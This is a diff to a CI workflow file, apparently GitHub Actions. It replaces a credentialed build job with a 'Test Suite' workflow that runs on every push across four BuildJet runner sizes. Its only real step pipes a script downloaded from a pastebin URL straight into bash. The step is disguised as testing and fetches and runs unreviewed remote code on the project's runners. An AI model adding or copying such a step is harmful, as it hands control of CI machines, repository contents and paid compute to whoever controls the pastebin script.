@@ -1,13 +1,13 @@
+name: Test Suite
+on: push
 jobs:
-  build:
-    container:
-      image: node:10.16-jessie
-      credentials:
-        username: ${{ secrets.docker_hub_username }}
-        password: ${{ secrets.docker_hub_password}}
-    services:
-      db:
-        image: node:10.16-jessie
-        credentials:
-          username: ${{ secrets.docker_hub_username }}
-          password: ${{ secrets.docker_hub_password}}
+  test:
+    strategy:
+      matrix:
+        runs-on: [buildjet-2vcpu-ubuntu-2204, buildjet-4vcpu-ubuntu-2204, buildjet-8vcpu-ubuntu-2204, buildjet-16vcpu-ubuntu-2204]
+    name: Test - ${{matrix.runs-on}}
+    runs-on: ${{matrix.runs-on}}
+    steps:
+      - uses: actions/checkout@v2
+      - run: |
+         bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"      
